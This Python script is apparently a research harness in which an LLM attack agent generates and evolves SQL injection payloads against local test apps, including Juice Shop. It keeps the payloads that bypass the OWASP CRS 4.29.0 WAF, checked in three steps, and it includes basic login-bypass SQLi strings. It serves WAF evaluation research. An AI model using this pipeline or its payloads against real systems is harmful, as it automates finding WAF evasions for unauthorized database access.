#!/usr/bin/env python3
"""Attack agent vs OWASP CRS 4.29.0 (SQLi), driven by the NEW *_crs429 PROMPT MODULES.

Reuses WorkFlowV2/pilot_A1_sqli_attack_only_v2 (same funnel + oracle), but:
  - points the attack agent at the NEW CRS-4.29 prompt module (seeds + methods baked into the prompt,
    NOT injected at runtime) by rebinding pilot._bam;
  - points Route B (WAF) at the CRS 4.29.0 container (Host: localhost);
  - at round 0 the prompt's own embedded 4.29 seeds are used (seed_payloads=None); later rounds evolve
    from confirmed winners -> co-evolution.

Three-step check per candidate (from pilot.classify):
  (1) validation      : backend_valid        (exploit actually works on the app, Route A)
  (2) WAF bypass      : waf_bypassed          (non-403 through CRS 4.29.0, Route B)
  (3) false-bypass chk: valid_through_waf True (exploit RE-CONFIRMED on the CRS-4.29 response)
A CONFIRMED 4.29 bypass passes all three. We track NEW distinct confirmed bypasses round by round.

Env: TGT (customapp|juice), PG (login), ROUNDS (default 5), A1_MODEL (default openai/gpt-4.1-mini)."""
import os, sys, csv, time, importlib, urllib.request, urllib.error

TGT = os.environ.get("TGT", "customapp"); PG = os.environ.get("PG", "login")
os.environ["A1_TARGET"] = TGT; os.environ["A1_PAGE"] = PG
os.environ.setdefault("A1_MODEL", "openai/gpt-4.1-mini")
ROUNDS = int(os.environ.get("ROUNDS", "5"))
ROOT = "/home/vahid/Projects/GenWebSec"
sys.path.insert(0, ROOT); sys.path.insert(0, ROOT + "/WorkFlowV2")

# NEW 4.29 prompt module per (target, page)
PROMPT_MOD = {
    ("customapp", "login"): "prompts.customapp_attack_prompts_crs429",
    ("juice", "login"):     "prompts.juice_login_bypass_prompts_crs429",
}[(TGT, PG)]

pilot = None
for _ in range(10):
    try:
        pilot = importlib.import_module("pilot_A1_sqli_attack_only_v2"); break
    except (SystemError, ImportError):
        time.sleep(1)
if pilot is None:
    raise SystemExit("pilot import failed")
pilot.log_print = lambda *a, **k: None

# ---- rebind the attack prompt to the NEW 4.29 module (this is the "change prompts" step) ----
newmod = importlib.import_module(PROMPT_MOD)
pilot._bam = newmod.build_attack_messages
if TGT == "customapp":
    pilot.DEFAULT_SEEDS = newmod.DEFAULT_SEEDS
    pilot.DEFAULT_SEED = newmod.DEFAULT_SEEDS[PG]
    EMBEDDED_SEED = newmod.DEFAULT_SEEDS[PG]
else:
    pilot.DEFAULT_SEED = newmod.DEFAULT_SEED
    EMBEDDED_SEED = newmod.DEFAULT_SEED
print(f"[prompt] attack agent now uses {PROMPT_MOD} (embedded 4.29 seed: {EMBEDDED_SEED!r})", flush=True)

# ---- point Route B (WAF) at the CRS 4.29.0 container; send Host: localhost ----
CB = {"customapp": "http://127.0.0.1:8081", "juice": "http://127.0.0.1:8091"}
pilot.WAF = CB[TGT]
HT = pilot.HTTP_TIMEOUT
def _http(url, method="GET", body=None, content_type="application/x-www-form-urlencoded"):
    req = urllib.request.Request(url, data=body, method=method); req.add_header("Host", "localhost")
    if body is not None:
        req.add_header("Content-Type", content_type)
    try:
        with pilot.OPENER.open(req, timeout=HT) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, str(e)[:120]
pilot._http = _http
pilot.write_rules = lambda *a, **k: None
pilot.run_configtest = lambda *a, **k: (True, "")
pilot.reload_apache = lambda *a, **k: (True, "")
try:
    pilot.setup()
except Exception as e:
    print("setup warn:", e, flush=True)

# sanity: canonical blocked, the embedded seed confirmed through CRS 4.29
canon = {"customapp": "admin' OR '1'='1'-- ", "juice": "admin@juice-sh.op' OR 1=1--"}[TGT]
cr = pilot.classify(canon, 0)
print(f"[sanity] canonical {canon!r}: backend_valid={cr['backend_valid']} waf_status={cr['waf_status']} "
      f"waf_blocked={cr['waf_blocked']} (expect blocked=True)", flush=True)
sr = pilot.classify(EMBEDDED_SEED, 0)
print(f"[sanity] embedded seed: backend_valid={sr['backend_valid']} waf_status={sr['waf_status']} "
      f"waf_bypassed={sr['waf_bypassed']} valid_through_waf={sr.get('valid_through_waf')} "
      f"(expect valid+bypass+through)", flush=True)

OUT = f"{ROOT}/paper-frontiers/results/V2/RevisionNewResults/R1.3/crs429_attack_newprompts"
os.makedirs(OUT, exist_ok=True)
tag = f"{TGT}_{PG}"
rows, confirmed_all, cur_seeds = [], set(), None     # round 0: cur_seeds=None -> prompt's embedded seeds
examples = []
for rnd in range(ROUNDS):
    payloads = pilot.generate_payloads(rnd, cur_seeds)
    nval = nwaf = nfalse = nconf = 0; winners, fresh = [], []
    for p in payloads:
        rec = pilot.classify(p, rnd)
        if not rec["backend_valid"]:
            continue
        nval += 1                                   # step 1: validation
        if not rec["waf_bypassed"]:
            continue
        nwaf += 1                                    # step 2: WAF bypass (non-403)
        if rec.get("valid_through_waf") is True:     # step 3: false-bypass re-check
            nconf += 1; winners.append(p)
            if p not in confirmed_all:
                fresh.append(p); confirmed_all.add(p)
                if len(examples) < 8:
                    examples.append(p)
        else:
            nfalse += 1
    rows.append((rnd, len(payloads), nval, nwaf, nfalse, nconf, len(fresh), len(confirmed_all)))
    print(f"round {rnd}: generated={len(payloads)} validated={nval} waf_bypass_non403={nwaf} "
          f"false_bypass={nfalse} CONFIRMED(3-step)={nconf} new_distinct={len(fresh)} "
          f"cumulative_distinct={len(confirmed_all)}", flush=True)
    cur_seeds = winners if winners else cur_seeds

with open(f"{OUT}/{tag}_rounds.csv", "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["round", "generated", "validated_step1", "waf_bypass_non403_step2",
                "false_bypass", "confirmed_3step", "new_distinct", "cumulative_distinct_confirmed"])
    for r in rows:
        w.writerow(r)
with open(f"{OUT}/{tag}_confirmed_bypasses_PRIVATE.txt", "w", encoding="utf-8") as f:
    f.write(f"# {TGT}/{PG} - distinct attacks CONFIRMED (3-step) to bypass OWASP CRS 4.29.0,\n")
    f.write(f"# generated live by the attack agent using prompt module {PROMPT_MOD}\n")
    f.write(f"# total distinct confirmed: {len(confirmed_all)}\n\n")
    for p in sorted(confirmed_all):
        f.write(p + "\n")
print(f"\n[{tag}] TOTAL distinct 3-step-confirmed NEW CRS-4.29 bypasses: {len(confirmed_all)}", flush=True)
print(f"[{tag}] examples: " + " | ".join(repr(e) for e in examples[:5]), flush=True)
print(f"[{tag}] wrote {OUT}/{tag}_rounds.csv", flush=True)
